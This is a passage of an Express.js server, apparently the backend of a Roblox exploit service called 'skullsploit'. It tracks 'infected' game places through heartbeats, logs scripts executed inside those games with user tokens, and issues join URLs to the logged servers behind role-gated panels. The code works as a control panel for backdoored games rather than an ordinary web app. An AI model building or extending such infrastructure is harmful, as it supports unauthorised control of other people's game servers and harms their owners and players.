  if (!placeId || !jobId) return res.status(400).json({ error: 'placeId and jobId required' });
  const pid = String(placeId).slice(0, 32);
  const id  = String(jobId).slice(0, 64);
  const cleanName = String(name || 'Untitled').slice(0, 80);
  const cleanThumb = typeof thumbnail === 'string' ? thumbnail.slice(0, 500) : null;

  activeGames.set(id, {
    placeId: pid,
    jobId: id,
    name: cleanName,
    players: Math.max(0, parseInt(players, 10) || 0),
    maxPlayers: Math.max(0, parseInt(maxPlayers, 10) || 0),
    thumbnail: cleanThumb,
    lastSeen: Date.now()
  });

  // record this place in the persistent registry so it stays listed even at 0 players
  const nowIso = new Date().toISOString();
  let place = infectedPlaces.get(pid);
  if (!place) {
    place = {
      placeId: pid,
      name: cleanName,
      thumbnail: cleanThumb,
      firstSeen: nowIso,
      lastSeen: nowIso
    };
    infectedPlaces.set(pid, place);
    placesDirty = true;
    audit(req, 'place.first_seen', pid, { name: cleanName });
  } else {
    place.lastSeen = nowIso;
    if (cleanName && cleanName !== 'Untitled' && place.name !== cleanName) { place.name = cleanName; placesDirty = true; }
    if (cleanThumb && place.thumbnail !== cleanThumb) { place.thumbnail = cleanThumb; placesDirty = true; }
  }

  res.json({ ok: true, ttl: Math.floor(HEARTBEAT_TTL / 1000) });
});

app.get('/api/games/my-token', requireUser, (req, res) => {
  const token = getMyToken(req.session.user.username);
  if (!token) return res.status(404).json({ error: 'not found' });
  res.json({ token });
});

app.post('/api/games/verify-token', checkLimiter, (req, res) => {
  const { token } = req.body || {};
  if (typeof token !== 'string' || !token || token.length > 128) return res.json({ valid: false });
  const devs  = readJson(DEVS_FILE, []);
  const users = readJson(USERS_FILE, []);
  let rec = devs.find(d => d.gameToken === token);
  let kind = 'dev';
  if (!rec) { rec = users.find(u => u.gameToken === token); kind = 'user'; }
  if (!rec) return res.json({ valid: false });
  const last = userActivity.get(rec.username);
  if (!last || Date.now() - last > ACTIVITY_WINDOW) return res.json({ valid: false, reason: 'not signed in' });
  res.json({ valid: true, username: rec.username, kind });
});

// ===== EXECUTION LOGS =====
app.post('/api/logs/execute', logLimiter, (req, res) => {
  const { token, robloxName, placeId, jobId, gameName, scriptTitle, scriptBody } = req.body || {};
  if (typeof token !== 'string' || !token) return res.status(400).json({ error: 'token required' });
  const devs  = readJson(DEVS_FILE, []);
  const users = readJson(USERS_FILE, []);
  let rec = devs.find(d => d.gameToken === token) || users.find(u => u.gameToken === token);
  if (!rec) return res.status(403).json({ error: 'invalid token' });

  const body = String(scriptBody || '');
  const entry = {
    id: crypto.randomUUID(),
    websiteUser: rec.username,
    kind: devs.includes(rec) ? 'dev' : 'user',
    robloxName: String(robloxName || '').slice(0, 64),
    placeId: String(placeId || '').slice(0, 32),
    jobId: String(jobId || '').slice(0, 64),
    gameName: String(gameName || 'Unknown').slice(0, 80),
    scriptTitle: String(scriptTitle || '').slice(0, 80),
    scriptPreview: body.slice(0, 280),
    scriptLength: body.length,
    at: new Date().toISOString()
  };
  const logs = readJson(LOGS_FILE, []);
  logs.unshift(entry);
  if (logs.length > LOG_MAX) logs.length = LOG_MAX;
  writeJson(LOGS_FILE, logs);
  res.json({ ok: true });
});

app.get('/api/logs', requireDev, (req, res) => {
  const me = req.session.user.username;
  const token = getMyToken(me);
  const logs = readJson(LOGS_FILE, []).slice(0, 500).map(l => ({
    ...l,
    joinUrl: l.placeId && l.jobId
      ? buildJoinUrl(l.placeId, l.jobId, token)
      : null
  }));
  res.json({ logs });
});

// ===== AUDIT LOG =====
app.get('/api/audit', auditLimiter, requireOwner, (req, res) => {
  const limit = Math.min(Math.max(parseInt(req.query.limit, 10) || 500, 1), 2000);
  const logs = readJson(AUDIT_FILE, []).slice(0, limit);
  res.json({ logs });
});

// ===== STATIC + GATED PAGES =====
app.use((req, res, next) => {
  // block direct access to protected html files
  if (req.path !== '/index.html' && req.path !== '/login.html' && req.path !== '/signup.html' && /\.html$/i.test(req.path)) {
    return res.status(404).send('not found');
  }
  next();
});
app.use(express.static(PUBLIC_DIR, { index: 'index.html', extensions: [] }));

function gated(file) {
  return (req, res) => {
    if (!req.session.user) return res.redirect('/');
    if (!userStillExists(req.session)) {
      return req.session.destroy(() => { res.clearCookie('skl.sid'); res.redirect('/'); });
    }
    res.sendFile(path.join(PUBLIC_DIR, file));
  };
}
function devOnly(file) {
  return (req, res) => {
    if (!req.session.user) return res.redirect('/login');
    if (!userStillExists(req.session)) {
      return req.session.destroy(() => { res.clearCookie('skl.sid'); res.redirect('/login'); });
    }
    if (req.session.user.kind !== 'dev') return res.redirect('/dashboard');
    res.sendFile(path.join(PUBLIC_DIR, file));
  };
}
function ownerOnly(file) {
  return (req, res) => {
    const u = req.session.user;
    if (!u) return res.redirect('/login');
    if (!userStillExists(req.session)) {
      return req.session.destroy(() => { res.clearCookie('skl.sid'); res.redirect('/login'); });
    }
    if (u.kind !== 'dev' || !isOwnerUsername(u.username)) return res.redirect('/dashboard');
    res.sendFile(path.join(PUBLIC_DIR, file));
  };
}
app.get('/dashboard',     gated('dashboard.html'));
app.get('/games',         gated('games.html'));
app.get('/game/:placeId', gated('game.html'));
app.get('/scripts',       gated('scripts.html'));
app.get('/dev',           devOnly('dev.html'));
app.get('/drops',         devOnly('drops.html'));
app.get('/logs',          devOnly('logs.html'));
app.get('/owner',         ownerOnly('owner.html'));
app.get('/audit',         ownerOnly('audit.html'));
app.get('/login',         (req, res) => res.sendFile(path.join(PUBLIC_DIR, 'login.html')));
app.get('/signup',        (req, res) => res.sendFile(path.join(PUBLIC_DIR, 'signup.html')));

app.use((req, res) => {
  if (req.path.startsWith('/api/')) return res.status(404).json({ error: 'not found' });
  res.status(404).redirect('/');
});
app.use((err, req, res, _next) => {
  if (err && err.type === 'entity.too.large') return res.status(413).json({ error: 'request too large' });
  if (err && err.type === 'entity.parse.failed') return res.status(400).json({ error: 'malformed request' });
  console.error('[err]', err && err.message);
  if (req.path.startsWith('/api/')) return res.status(500).json({ error: 'server error' });
  res.status(500).send('server error');
});

app.listen(PORT, () => {
  console.log(`skullsploit listening on :${PORT}${PROD ? ' (prod)' : ''}`);
});
